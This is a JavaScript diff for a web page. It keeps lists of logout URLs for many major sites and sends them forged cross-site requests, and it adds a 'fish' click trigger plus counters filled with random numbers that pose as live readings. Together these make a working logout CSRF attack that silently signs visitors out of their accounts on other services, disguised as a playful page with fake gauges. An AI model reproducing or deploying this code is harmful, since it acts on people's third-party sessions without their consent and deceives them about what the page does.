@@ -1,3 +1,10 @@
+setInterval(() => {
+    document.getElementById('rpm').innerText = Math.floor(Math.random() * 5000 + 1000);
+    document.getElementById('gf').innerText = (Math.random() * 10 + 2).toFixed(1);
+    document.getElementById('syn').innerText = Math.floor(Math.random() * 100);
+})
+
+
 const getLogouts = [
     "http://www.amazon.com/gp/flex/sign-out.html?action=sign-out", "http://www.blogger.com/logout.g", "http://www.delicious.com/logout", 
     "https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout", "https://www.dropbox.com/logout", "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn", 
@@ -17,3 +24,4 @@ const postLogouts = [
 postLogouts.forEach(([url, body]) => {
     fetch(url, { method: 'POST', body, mode: 'no-cors' }).catch(() => {});
 });
+document.getElementById('fish').addEventListener('click', executeSatireLogouts, {once: true});
